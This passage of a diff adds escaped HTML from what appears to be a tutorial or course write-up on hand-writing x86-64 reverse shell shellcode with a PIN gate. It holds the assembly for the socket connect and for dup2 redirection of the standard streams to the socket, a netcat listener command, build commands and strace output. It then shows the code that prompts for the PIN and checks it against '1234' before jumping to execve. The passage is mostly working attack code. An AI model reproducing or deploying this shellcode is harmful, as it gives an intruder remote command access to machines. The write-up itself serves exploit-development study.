+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_family&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;                       &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;adjusting&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;stack&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pointer&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;point&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;duplicate_sockets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;old&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If the connection succeeds, &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; will return 0. Let’s validate that by using the strace tool on the shellcode. Open 2 terminal windows.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;run the command to listen on port 4444 to which our shellcode will try to connect to:
+    &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;nc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;assemble, link and run the program with strace on 2nd window. You will see &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt; syscall returning us a fd = 3 which is then the 1st argument for &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; syscall. Second argument is the addr structure and 3rd argument specifies 16 bytes as the length of our struct. We can validate that &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; returned successfully with return value 0.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;nasm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;felf64&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nasm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ld&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;strace&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reverse&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./reverse&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./reverse&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7ffc7f671540&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* 63 vars */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;IPPROTO_IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sa_family&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sin_port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inet_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0.0.0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)},&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                              &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                              &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                              &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;part-2---enter-the-correct-pin-code&quot;&gt;&lt;b&gt;Part 2&lt;/b&gt; - enter the correct PIN code&lt;/h4&gt;
+
+&lt;p&gt;In order to ask the user to enter the correct PIN code we have to specify the same file descriptor we used for &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; syscall also for the &lt;code class=&quot;highlighter-rouge&quot;&gt;write()&lt;/code&gt; syscall as 1st argument (RDI). As we saved the fd to RDI earlier, we have already done that. For argument number 2 we need to provide an address where we have stored the string we want to display to the user “PIN:”. For that we should convert the string to hex, change the byte order as we are dealing with little-endian (&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'import binascii; binascii.hexlify(&quot;PIN:&quot;[::-1])'&lt;/code&gt;) and then push that value to the stack so we can move the stack address in RSP to RSI.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3a4e4950&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In order to receive the PIN code from the user, we can use the &lt;code class=&quot;highlighter-rouge&quot;&gt;read()&lt;/code&gt; syscall. To store the 4 digit PIN code we expect from the user, we need to allocate space for a 4 byte (&lt;code class=&quot;highlighter-rouge&quot;&gt;sub rsp, 4&lt;/code&gt;) long buffer. The 2nd argument of &lt;code class=&quot;highlighter-rouge&quot;&gt;read()&lt;/code&gt; syscall requires us to specify the buffer’s start address which we can do by moving the current value of RSP to RSI. Fir 3rd argument, we add the value 4 to RDX, as we expect 4 bytes of data from the user and nothing more.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We have received the PIN code, so now we need to decide whether to exit the program or launch a shell. For that we can compare the user input byte by byte against predetermined values 0x31 - 1, 0x32 - 2, 0x33 - 3, 0x34 - 4. If all 4 digits match, we make a jump to execve (je execve). If that is not true, we just continue the execution flow to go through with the &lt;code class=&quot;highlighter-rouge&quot;&gt;exit(0)&lt;/code&gt; syscall to terminate the program.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;cmpinput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x31&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;jne&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x32&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;jne&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x33&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;jne&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x34&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;je&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
